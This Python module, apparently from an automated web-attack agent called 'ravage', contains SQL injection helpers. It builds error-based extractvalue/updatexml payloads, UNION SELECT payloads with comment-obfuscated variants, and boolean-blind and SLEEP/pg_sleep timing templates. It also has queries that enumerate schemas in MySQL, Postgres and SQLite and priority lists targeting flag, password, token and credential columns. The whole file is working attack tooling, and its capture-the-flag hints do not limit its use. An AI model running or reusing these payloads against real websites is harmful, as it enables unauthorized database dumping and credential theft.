from __future__ import annotations

import difflib
import html
import json
import re
from dataclasses import dataclass

from ravage.agent_core.agent_state import AgentState
from ravage.web_core.http_probe import ProbeResponse
from ravage.web_core.proof_recognizer import recognize_proofs

from .common import _dedupe, _string_items
from .models import (
    BaselineValue,
    COMMON_COLUMNS,
    FAST_CREDENTIAL_COLUMNS,
    FAST_CREDENTIAL_TABLES,
    FAST_FLAG_COLUMNS,
    FAST_FLAG_TABLES,
    TIMING_TRUE_FACTOR,
    ValueExpr,
)


@dataclass(frozen=True)
class _BooleanTemplateSignal:
    kind: str
    url: str
    input_name: str
    template: str


@dataclass
class _BooleanTemplateBuckets:
    exact: list[str]
    same_url_input: list[str]
    legacy_same_input: list[str]

    @classmethod
    def empty(cls) -> _BooleanTemplateBuckets:
        return cls(exact=[], same_url_input=[], legacy_same_input=[])

    def ordered_templates(self) -> list[str]:
        templates: list[str] = []
        templates.extend(self.exact)
        templates.extend(self.same_url_input)
        templates.extend(self.legacy_same_input)
        return templates

def _error_payload(prefix: str, function_name: str, expr: str) -> str:
    if function_name == "extractvalue":
        return f"{prefix} and extractvalue(1,concat(0x7e,({expr}),0x7e))-- -"
    return f"{prefix} and updatexml(1,concat(0x7e,({expr}),0x7e),1)-- -"

def _union_placeholder_values(column_count: int) -> list[str]:
    return [str(index + 1) for index in range(column_count)]

def _union_select_payload(
    prefix: str,
    values: list[str],
    *,
    style: str,
    from_table: str | None = None,
) -> str:
    if style == "comment":
        payload = f"{prefix}/**/UNION/**/SELECT/**/{','.join(values)}"
        if from_table:
            payload += f"/**/FROM/**/{_plain_sql_identifier(from_table)}"
        return payload + "#"
    payload = f"{prefix} union select {','.join(values)}"
    if from_table:
        payload += f" from {_sql_ident(from_table)}"
    return payload + "-- -"

def _plain_sql_identifier(value: str) -> str:
    cleaned = re.sub(r"[^A-Za-z0-9_$]", "", value)
    return cleaned or "users"

def _extract_visible_union_value(body: str, *, payload: str) -> str:
    text = html.unescape(re.sub(r"<[^>]+>", " ", body))
    for variant in _reflected_payload_variants(payload):
        text = text.replace(variant, "")
    for pattern in (
        r"User exists:\s*([^<\r\n]{1,260})",
        r"(?:result|value|password|secret|token)\s*[:=]\s*([^<\r\n]{1,260})",
    ):
        match = re.search(pattern, text, flags=re.IGNORECASE)
        if match:
            value = _clean_leak(match.group(1))
            if _visible_union_value_looks_executed(value):
                return value
    for proof in recognize_proofs(text):
        return proof
    tilde = _extract_tilde_value(text)
    if _visible_union_value_looks_executed(tilde):
        return tilde
    return ""

def _visible_union_value_looks_executed(value: str) -> bool:
    lowered = value.lower()
    if not value:
        return False
    if any(marker in lowered for marker in ("union", "select", "from", "no results", "filtered", "syntax", "unknown column")):
        return False
    return True

def _prefixes(baseline: str) -> list[str]:
    values = [
        "'",
        "')",
        "%')",
        "x'",
        "x')",
        f"{baseline}'",
        f"{baseline}')",
        '"',
        '")',
        '%")',
        'x"',
        'x")',
        f'{baseline}"',
        f'{baseline}")',
        "1",
        "1)",
        "0",
    ]
    return _dedupe(values)

def _target_baseline_value(
    target: dict[str, object],
    input_name: str,
    fallback: BaselineValue,
) -> str:
    value = str(target.get("baseline") or "")
    if value:
        return value
    return fallback(input_name)

def _boolean_templates(baseline: str) -> list[str]:
    return [
        f"{baseline}' OR ({{cond}})-- -",
        f'{baseline}" OR ({{cond}})-- -',
        "' OR ({cond})-- -",
        '" OR ({cond})-- -',
        "x' OR ({cond}) OR 'x'='y",
        'x" OR ({cond}) OR "x"="y',
        "x'||({cond})||'",
        'x"||({cond})||"',
        "1 OR ({cond})",
        "1) OR ({cond})-- -",
    ]

def _confirmed_boolean_templates(state: object, target: dict[str, object]) -> list[str]:
    raw_templates = _raw_boolean_template_signals(state)
    target_signal = _target_boolean_template_signal(target)
    buckets = _BooleanTemplateBuckets.empty()
    for raw in raw_templates:
        signal = _parse_boolean_template_signal(raw)
        if signal is None:
            continue

        bucket = _boolean_template_bucket(signal, target_signal, buckets)
        if bucket is None:
            continue

        _append_template_once(bucket, signal.template)
    return buckets.ordered_templates()

def _raw_boolean_template_signals(state: object) -> list[object]:
    signals = getattr(state, "signals", None)
    if not isinstance(signals, dict):
        return []

    raw_templates = signals.get("sqli_boolean_templates")
    if not isinstance(raw_templates, list):
        return []

    return raw_templates

def _target_boolean_template_signal(target: dict[str, object]) -> _BooleanTemplateSignal:
    return _BooleanTemplateSignal(
        kind=str(target.get("kind") or ""),
        url=str(target.get("url") or ""),
        input_name=str(target.get("input") or ""),
        template="",
    )

def _parse_boolean_template_signal(raw: object) -> _BooleanTemplateSignal | None:
    try:
        data = json.loads(str(raw))
    except (ValueError, TypeError):
        return None

    if not isinstance(data, dict):
        return None

    template = str(data.get("template") or "")
    if "{cond}" not in template:
        return None

    return _BooleanTemplateSignal(
        kind=str(data.get("kind") or ""),
        url=str(data.get("url") or ""),
        input_name=str(data.get("input") or ""),
        template=template,
    )

def _boolean_template_bucket(
    signal: _BooleanTemplateSignal,
    target: _BooleanTemplateSignal,
    buckets: _BooleanTemplateBuckets,
) -> list[str] | None:
    if _boolean_template_is_exact_match(signal, target):
        return buckets.exact

    if _boolean_template_is_same_url_input(signal, target):
        return buckets.same_url_input

    if _boolean_template_is_legacy_same_input(signal, target):
        return buckets.legacy_same_input

    return None

def _boolean_template_is_exact_match(
    signal: _BooleanTemplateSignal,
    target: _BooleanTemplateSignal,
) -> bool:
    if signal.kind != target.kind:
        return False
    if signal.url != target.url:
        return False
    return signal.input_name == target.input_name

def _boolean_template_is_same_url_input(
    signal: _BooleanTemplateSignal,
    target: _BooleanTemplateSignal,
) -> bool:
    if signal.url != target.url:
        return False
    return signal.input_name == target.input_name

def _boolean_template_is_legacy_same_input(
    signal: _BooleanTemplateSignal,
    target: _BooleanTemplateSignal,
) -> bool:
    if signal.url:
        return False
    if signal.kind:
        return False
    return signal.input_name == target.input_name

def _append_template_once(bucket: list[str], template: str) -> None:
    if template in bucket:
        return
    bucket.append(template)

def _extract_error_leak(body: str) -> str:
    text = html.unescape(re.sub(r"<[^>]+>", " ", body))
    value = _extract_tilde_value(text)
    if value:
        return value
    for pattern in (
        r"XPATH syntax error:\s*[\"']?([^\"'\n\r<]{1,260})",
        r"SQL syntax[^~]{0,120}(~[^~]{1,220}~)",
        r"Warning:\s*mysqli[^:]*:\s*([^<\n\r]{1,260})",
    ):
        match = re.search(pattern, text, flags=re.IGNORECASE)
        if match:
            return _clean_leak(match.group(1))
    return ""

def _extract_tilde_value(body: str) -> str:
    text = html.unescape(re.sub(r"<[^>]+>", " ", body))
    match = re.search(r"~([^~]{1,260})~", text)
    return _clean_leak(match.group(1)) if match else ""

def _clean_leak(value: str) -> str:
    cleaned = re.sub(r"\s+", " ", value).strip(" \t\r\n'\"`~")
    cleaned = cleaned.replace("\\n", " ").strip()
    if cleaned.lower().startswith("xpath syntax error"):
        return ""
    return cleaned[:260]

def _useful_leak(value: str) -> bool:
    cleaned = value.strip()
    lowered = cleaned.lower()
    return bool(cleaned) and "syntax" not in lowered and "warning" not in lowered and len(cleaned) <= 220

def _useful_data_value(value: str) -> bool:
    if not _useful_leak(value):
        return False
    lowered = value.lower()
    if lowered in {"null", "none", "0", "1", "no rows", "noleak"}:
        return False
    if any(fragment in lowered for fragment in ("unknown column", "doesn't exist", "syntax error", "xpath")):
        return False
    return True

def _target_looks_primary_public_query(target: dict[str, object]) -> bool:
    text = _target_query_text(target)
    if _contains_marker(text, ("login", "signin", "auth", "password", "credential", "session")):
        return False

    public_markers = (
        "search",
        "query",
        "catalog",
        "product",
        "category",
        "filter",
        "lookup",
        "item",
        "job",
        "api",
    )

    return _contains_marker(text, public_markers)

def _target_query_text(target: dict[str, object]) -> str:
    parts: list[str] = []
    for key in ("kind", "url", "input"):
        value = target.get(key)
        parts.append(str(value or ""))

    hints = _string_items(target.get("hints"))
    parts.append(" ".join(hints))
    return " ".join(parts).lower()

def _contains_marker(text: str, markers: tuple[str, ...]) -> bool:
    for marker in markers:
        if marker in text:
            return True
    return False

def _split_sql_items(value: str) -> list[str]:
    items: list[str] = []
    for raw_item in value.split(","):
        cleaned = _clean_identifier(raw_item)
        if cleaned:
            items.append(cleaned)
    return items

def _clean_identifier(value: str) -> str:
    cleaned = re.sub(r"[^A-Za-z0-9_$.-]", "", _clean_leak(value))
    return cleaned[:80]

def _sql_ident(value: str) -> str:
    cleaned = re.sub(r"`", "``", value)
    return f"`{cleaned}`"

def _sql_hex_string(value: str) -> str:
    return "0x" + value.encode("utf-8", errors="ignore").hex()

def _sql_string_literal(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"

def _schema_match_expr(database_name: str) -> str:
    return _sql_hex_string(database_name) if database_name else "database()"

def _mysql_expr(table: str, column: str, row_index: int) -> str:
    return f"select cast({_sql_ident(column)} as char) from {_sql_ident(table)} limit {row_index},1"

def _sqlite_expr(table: str, column: str, row_index: int) -> str:
    return f"select cast({_sql_ident(column)} as text) from {_sql_ident(table)} limit 1 offset {row_index}"

def _postgres_ident(value: str) -> str:
    cleaned = value.replace('"', '""')
    return f'"{cleaned}"'

def _postgres_expr(table: str, column: str, row_index: int) -> str:
    return f"select cast({_postgres_ident(column)} as text) from {_postgres_ident(table)} limit 1 offset {row_index}"

def _timing_signal_confirmed(state: AgentState) -> bool:
    markers = state.signals.get("markers", [])
    return "blind_sql_injection_timing_signal" in markers

def _format_delay(delay: float) -> str:
    text = f"{delay:.3f}".rstrip("0").rstrip(".")
    return text or "0"

def _timing_templates(baseline: str, delay: float) -> list[tuple[str, str]]:
    sleep = _format_delay(delay)
    mysql = [
        f"{baseline}' OR IF(({{cond}}),SLEEP({sleep}),0)-- -",
        f'{baseline}" OR IF(({{cond}}),SLEEP({sleep}),0)-- -',
        f"{baseline}' AND IF(({{cond}}),SLEEP({sleep}),0)-- -",
        f"1 OR IF(({{cond}}),SLEEP({sleep}),0)",
    ]
    postgres = [
        f"{baseline}';SELECT CASE WHEN ({{cond}}) THEN pg_sleep({sleep}) ELSE pg_sleep(0) END-- -",
        f"{baseline}' AND (SELECT CASE WHEN ({{cond}}) THEN pg_sleep({sleep}) ELSE pg_sleep(0) END) IS NOT NULL-- -",
    ]
    return [(template, "mysql") for template in mysql] + [(template, "postgres") for template in postgres]

def _timing_delta_matches(
    baseline: ProbeResponse,
    candidate: ProbeResponse,
    delay_ms: float,
) -> bool:
    elapsed_delta = candidate.elapsed_ms - baseline.elapsed_ms
    threshold = delay_ms * TIMING_TRUE_FACTOR
    if elapsed_delta >= threshold:
        return True
    return False

def _timing_value_candidates(dialect: str) -> tuple[tuple[ValueExpr, str], ...]:
    if dialect == "postgres":
        return ((_postgres_expr, "postgres"),)
    return ((_mysql_expr, "mysql"),)

def _fallback_columns_for_table(table: str) -> list[str]:
    lowered = table.lower()
    if lowered in FAST_FLAG_TABLES or any(marker in lowered for marker in ("flag", "secret", "token")):
        return list(FAST_FLAG_COLUMNS)
    if lowered in FAST_CREDENTIAL_TABLES or any(marker in lowered for marker in ("user", "admin", "account", "credential")):
        return list(FAST_CREDENTIAL_COLUMNS)
    return COMMON_COLUMNS


_BLIND_TABLE_PRIORITY = [
    "flag", "flags", "secret", "secrets", "users", "user", "admin", "admins",
    "accounts", "credentials", "members", "config", "settings",
]
_BLIND_COLUMN_PRIORITY = [
    "flag", "secret", "password", "passwd", "pass", "token", "value", "content",
    "data", "key", "private", "note", "username", "email", "name",
]

def _blind_tables_expr(dialect: str) -> str:
    if dialect == "sqlite":
        return "select group_concat(name) from sqlite_master where type='table'"
    if dialect == "postgres":
        return "select string_agg(table_name,',') from information_schema.tables where table_schema=current_schema()"
    return "select group_concat(table_name) from information_schema.tables where table_schema=database()"

def _blind_columns_expr(dialect: str, table: str) -> str:
    if dialect == "sqlite":
        return f"select group_concat(name) from pragma_table_info({_sql_string_literal(table)})"
    if dialect == "postgres":
        return (
            "select string_agg(column_name,',') from information_schema.columns "
            f"where table_schema=current_schema() and table_name={_sql_string_literal(table)}"
        )
    return (
        "select group_concat(column_name) from information_schema.columns "
        f"where table_schema=database() and table_name={_sql_hex_string(table)}"
    )

def _responses_differ(left: ProbeResponse, right: ProbeResponse) -> bool:
    if left.status != right.status:
        return True
    if abs(len(left.body) - len(right.body)) >= 20:
        return True
    left_markers = set(_result_markers(left.body))
    right_markers = set(_result_markers(right.body))
    return bool(left_markers ^ right_markers) or difflib.SequenceMatcher(None, left.body, right.body).ratio() < 0.96

def _same_response_template_after_reflection(
    left_body: str,
    right_body: str,
    *,
    left_payload: str,
    right_payload: str,
) -> bool:
    if not left_payload or left_payload not in left_body:
        return False
    if not right_payload or right_payload not in right_body:
        return False
    return _normalize_reflected_payload(left_body, left_payload) == _normalize_reflected_payload(right_body, right_payload)

def _normalize_reflected_payload(body: str, payload: str) -> str:
    normalized = body
    for variant in _reflected_payload_variants(payload):
        normalized = normalized.replace(variant, "__RAVAGE_REFLECTED_PAYLOAD__")
    return normalized

def _union_marker_is_executed(body: str, *, payload: str, marker: str) -> bool:
    if marker not in body:
        return False
    stripped = _strip_reflected_payload(body, payload)
    if marker not in stripped:
        return False
    context = _marker_context(stripped, marker).lower()
    if "union" in context and "select" in context:
        return False
    return True

def _strip_reflected_payload(body: str, payload: str) -> str:
    stripped = body
    for variant in _reflected_payload_variants(payload):
        stripped = stripped.replace(variant, "")
    return stripped

def _reflected_payload_variants(payload: str) -> tuple[str, ...]:
    return (
        payload,
        payload.replace("'", "&#x27;"),
        payload.replace("'", "&#39;"),
        payload.replace('"', "&quot;"),
        payload.replace("<", "&lt;").replace(">", "&gt;"),
    )

def _marker_context(text: str, marker: str) -> str:
    position = text.find(marker)
    if position < 0:
        return ""
    start = max(0, position - 80)
    end = min(len(text), position + len(marker) + 80)
    return text[start:end]

def _responses_are_boolean_oracle(
    true_response: ProbeResponse,
    false_response: ProbeResponse,
    true_confirm: ProbeResponse,
    false_confirm: ProbeResponse,
) -> bool:
    if not _responses_differ(true_response, false_response):
        return False
    if not _same_response_bucket(true_response, true_confirm):
        return False
    if not _same_response_bucket(false_response, false_confirm):
        return False
    return _responses_differ(true_confirm, false_confirm)

def _strong_boolean_pair(true_response: ProbeResponse, false_response: ProbeResponse) -> bool:
    if not _responses_differ(true_response, false_response):
        return False
    true_markers = set(_result_markers(true_response.body))
    false_markers = set(_result_markers(false_response.body))
    positive = {"user exists", "welcome", "admin", "flag{"}
    negative = {"no results", "invalid", "filtered"}
    if true_markers & positive and false_markers & negative and not false_markers & positive:
        return True
    if true_response.status != false_response.status and true_response.status in {200, 201, 202}:
        return True
    return False

def _same_response_bucket(left: ProbeResponse, right: ProbeResponse) -> bool:
    if left.status != right.status:
        return False
    if set(_result_markers(left.body)) != set(_result_markers(right.body)):
        return False
    if abs(len(left.body) - len(right.body)) >= 40:
        return False
    return difflib.SequenceMatcher(None, left.body[:4000], right.body[:4000]).ratio() >= 0.93

def _similarity(status: int | None, body: str, expected_status: int | None, expected_body: str) -> float:
    score = 0.2 if status == expected_status else 0.0
    return score + difflib.SequenceMatcher(None, body[:4000], expected_body[:4000]).ratio()

def _result_markers(body: str) -> list[str]:
    lowered = body.lower()
    markers: list[str] = []
    for marker in ("no results", "user exists", "welcome", "invalid", "filtered", "logout", "admin", "flag{"):
        if marker in lowered:
            markers.append(marker)
    return markers
